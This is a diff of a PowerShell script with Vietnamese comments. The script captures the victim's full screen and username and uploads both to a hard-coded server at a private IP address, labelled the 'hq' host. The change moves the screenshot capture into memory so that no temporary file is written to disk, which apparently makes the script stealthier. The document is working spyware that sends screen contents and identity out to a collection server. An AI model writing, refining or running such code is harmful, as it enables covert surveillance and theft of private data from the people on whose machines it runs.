@@ -4,30 +4,35 @@ $hq = "http://192.168.102.132:2024"
 # Lấy tên người dùng hiện tại
 $name = whoami
 
-# Chụp màn hình và lưu tạm thời
-$screenshotPath = "$env:temp\screenshot.png"
+# Chụp màn hình trực tiếp vào bộ nhớ
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bmp = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-$graphics = [Drawing.Graphics]::FromImage($bmp)
-$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size)
-$bmp.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
 
-# Gửi dữ liệu tới server
-$uri = "$hq/upload"
+# Chuyển ảnh sang MemoryStream thay vì lưu vào file
+$memoryStream = New-Object System.IO.MemoryStream
+$bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+$bitmap.Dispose()
+$graphics.Dispose()
+
+# Chuyển MemoryStream thành mảng byte để gửi đi
+$imageData = $memoryStream.ToArray()
+$memoryStream.Dispose()
+
+# Gửi dữ liệu hình ảnh tới server
+$uriUpload = "$hq/upload"
 $client = New-Object System.Net.WebClient
-$client.Headers.Add("Content-Type", "multipart/form-data")
-$fileContent = Get-Content -Path $screenshotPath -Encoding Byte
-$client.UploadData($uri, $fileContent)
+$client.Headers.Add("Content-Type", "application/octet-stream")
+$client.UploadData($uriUpload, "POST", $imageData)
 
 # Gửi tên người dùng
+$uriData = "$hq/data"
 $client.Headers.Clear()
 $client.Headers.Add("Content-Type", "application/json")
 $data = @{ name = $name }
-$jsonData = $data | ConvertTo-Json
-$client.UploadString("$hq/data", "POST", $jsonData)
-
-# Xoá file tạm
-Remove-Item $screenshotPath -Force
+$jsonData = $data | ConvertTo-Json -Depth 10
+$client.UploadString($uriData, "POST", $jsonData)
